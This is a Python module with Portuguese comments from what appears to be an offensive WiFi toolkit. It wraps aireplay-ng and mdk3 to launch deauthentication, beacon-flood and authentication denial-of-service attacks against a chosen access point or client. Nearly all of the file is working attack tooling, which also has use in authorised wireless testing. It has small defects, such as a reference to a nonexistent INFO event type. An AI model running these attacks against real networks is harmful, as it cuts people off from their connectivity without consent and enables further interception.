"""
Módulo de ataque de desautenticação.

Este módulo implementa ataques de desautenticação contra redes WiFi, permitindo:
- Desautenticar clientes específicos
- Desautenticar todos os clientes de uma rede
- Enviar pacotes de desautenticação em massa
- Realizar ataques Beacon Flood
- Realizar ataques de desautenticação direcionados
"""
import os
import re
import time
import logging
import subprocess
import tempfile
from typing import Optional, Dict, List, Tuple, Any, Callable, Union
from dataclasses import dataclass, field
from enum import Enum, auto

from rich.console import Console
from rich.progress import Progress, SpinnerColumn, TextColumn

from ...core.models.network import WiFiNetwork, WiFiClient
from ...core.utils import (
    is_root, check_dependencies, get_network_interfaces,
    set_monitor_mode, restore_network_interface, command_exists,
    get_interface_mac
)

# Importa o decorador de registro de ataques
from . import register_attack

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
console = Console()

class DeauthAttackType(Enum):
    """Tipos de ataque de desautenticação."""
    DEAUTH = auto()          # Desautenticação padrão
    AUTH = auto()            # Pacotes de autenticação
    BEACON = auto()          # Beacon flood
    DISASSOC = auto()        # Desassociação
    PROBE_RESP = auto()      # Resposta a sondas
    AUTH_DOS = auto()        # Negação de serviço por autenticação
    DEAUTH_BROADCAST = auto() # Desautenticação em broadcast
    DEAUTH_MULTICAST = auto() # Desautenticação em multicast
    DEAUTH_DIRECTED = auto()  # Desautenticação direcionada

class DeauthEventType(Enum):
    """Tipos de eventos do ataque de desautenticação."""
    START = auto()
    PACKET_SENT = auto()
    CLIENT_DISCONNECTED = auto()
    ERROR = auto()
    COMPLETE = auto()
    STATUS = auto()

@dataclass
class DeauthEvent:
    """Evento de progresso do ataque de desautenticação."""
    type: DeauthAttackType
    message: str = ""
    data: Dict[str, Any] = field(default_factory=dict)

@register_attack
class DeauthAttack:
    """
    Ataque de desautenticação WiFi.
    
    Este ataque envia pacotes de desautenticação para desconectar clientes de uma rede WiFi.
    Pode ser direcionado a um cliente específico ou a todos os clientes de uma rede.
    """
    
    # Metadados do ataque
    name = "deauth"
    description = "Ataque de desautenticação WiFi para desconectar clientes de uma rede"
    
    def __init__(self):
        """Inicializa o ataque de desautenticação."""
        self.interface = None
        self.deauth_type = None
        self.is_running = False
        self.stop_requested = False
        self.packets_sent = 0
        self.process = None
        self._check_dependencies()
    
    def _check_dependencies(self) -> None:
        """Verifica se todas as dependências necessárias estão instaladas."""
        required = ['aireplay-ng', 'mdk4', 'mdk3', 'iwconfig', 'ifconfig']
        missing = [cmd for cmd in required if not command_exists(cmd)]
        
        if missing:
            raise RuntimeError(
                f"As seguintes dependências estão faltando: {', '.join(missing)}\n"
                "Instale-as com: sudo apt install aircrack-ng mdk4 mdk3 wireless-tools"
            )
    
    def run(self, *, iface: str, target: Optional[str] = None, **kwargs) -> bool:
        """
        Executa o ataque de desautenticação.
        
        Args:
            iface: Interface de rede a ser usada
            target: Endereço MAC do alvo (pode ser um cliente ou AP)
            **kwargs: Argumentos adicionais:
                - bssid: Endereço MAC do ponto de acesso (obrigatório se target for um cliente)
                - client_mac: Endereço MAC do cliente (opcional, None para broadcast)
                - count: Número de pacotes a enviar (0 para contínuo, padrão: 0)
                - delay: Atraso entre pacotes em ms (padrão: 100)
                - reason: Código de motivo (padrão: 7)
                - channel: Canal da rede (opcional, tenta detectar)
                - deauth_type: Tipo de ataque (padrão: DEAUTH)
        """
        self.interface = iface
        bssid = target or kwargs.get('bssid')
        client_mac = kwargs.get('client_mac')
        count = kwargs.get('count', 0)
        delay = kwargs.get('delay', 100)
        reason = kwargs.get('reason', 7)
        channel = kwargs.get('channel')
        deauth_type = kwargs.get('deauth_type', 'DEAUTH')
        
        # Configura o tipo de ataque
        self.deauth_type = DeauthAttackType[deauth_type.upper()] if isinstance(deauth_type, str) else deauth_type
        
        # Função de callback padrão
        def default_callback(event):
            if event.type == DeauthEventType.INFO:
                logger.info(event.message)
            elif event.type == DeauthEventType.ERROR:
                logger.error(event.message)
        
        callback = kwargs.get('callback', default_callback)
        
        def event_handler(event_type: DeauthEventType, message: str = "", **kwargs):
            if callback:
                event = DeauthEvent(type=event_type, message=message, data=kwargs)
                callback(event)
        
        try:
            # Verifica privilégios
            if not is_root():
                raise PermissionError("Este ataque requer privilégios de root")
            
            # Define o canal, se especificado
            if channel:
                self._set_channel(channel)
            
            # Prepara o comando com base no tipo de ataque
            if self.deauth_type == DeauthAttackType.BEACON:
                cmd = self._prepare_beacon_attack(bssid, essid="FREE_WIFI")
            elif self.deauth_type == DeauthAttackType.AUTH_DOS:
                cmd = self._prepare_auth_dos(bssid)
            else:  # Desautenticação padrão
                cmd = self._prepare_standard_deauth(bssid, client_mac, count, delay, reason)
            
            event_handler(DeauthEventType.START, f"Iniciando ataque {self.deauth_type.name}...")
            
            # Executa o comando em segundo plano
            self.process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True
            )
            
            # Monitora a saída
            start_time = time.time()
            self.is_running = True
            
            while True:
                # Verifica se foi solicitado para parar
                if self.stop_requested:
                    self._stop_process()
                    event_handler(DeauthEventType.COMPLETE, "Ataque interrompido pelo usuário")
                    return True
                
                # Verifica se o processo ainda está em execução
                if self.process.poll() is not None:
                    break
                
                # Lê a saída
                line = self.process.stdout.readline()
                if line:
                    # Conta os pacotes enviados
                    if "DeAuth" in line or "Sent" in line:
                        self.packets_sent += 1
                        event_handler(
                            DeauthEventType.PACKET_SENT,
                            f"Pacote {self.packets_sent} enviado",
                            packets_sent=self.packets_sent
                        )
                    
                    # Verifica se um cliente foi desconectado
                    if "deauth" in line.lower() or "disassoc" in line.lower():
                        event_handler(
                            DeauthEventType.CLIENT_DISCONNECTED,
                            f"Cliente {client_mac or 'broadcast'} desconectado",
                            client_mac=client_mac,
                            bssid=bssid
                        )
                
                # Aguarda um pouco antes da próxima verificação
                time.sleep(0.1)
            
            event_handler(DeauthEventType.COMPLETE, "Ataque concluído")
            return True
            
        except Exception as e:
            event_handler(DeauthEventType.ERROR, f"Erro durante o ataque: {str(e)}")
            return False
        finally:
            self.is_running = False
    
    def _set_channel(self, channel: int) -> None:
        """Define o canal da interface de rede."""
        try:
            subprocess.run(
                ["iwconfig", self.interface, "channel", str(channel)],
                check=True,
                capture_output=True
            )
        except subprocess.CalledProcessError as e:
            raise RuntimeError(f"Falha ao definir o canal {channel}: {e.stderr}")
    
    def _prepare_standard_deauth(self, bssid: str, client_mac: str = None,
                               count: int = 0, delay: int = 100,
                               reason: int = 7) -> List[str]:
        """Prepara o comando para desautenticação padrão."""
        cmd = ["aireplay-ng", "--deauth", str(count) if count > 0 else "0",
               "-a", bssid, "-D", str(delay), "--ignore-negative-one"]
        
        if client_mac:
            cmd.extend(["-c", client_mac])
        
        cmd.append(self.interface)
        return cmd
    
    def _prepare_beacon_attack(self, bssid: str, essid: str = "FREE_WIFI") -> List[str]:
        """Prepara o comando para ataque de Beacon Flood."""
        return ["mdk3", self.interface, "b", "-n", essid, "-c", "1", "-s", "100"]
    
    def _prepare_auth_dos(self, bssid: str) -> List[str]:
        """Prepara o comando para ataque de negação de serviço por autenticação."""
        return ["mdk3", self.interface, "a", "-a", bssid, "-m"]
    
    def _stop_process(self) -> None:
        """Para o processo em execução."""
        if self.process and self.process.poll() is None:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
    
    def stop(self) -> None:
        """Solicita a interrupção do ataque."""
        self.stop_requested = True
        self._stop_process()
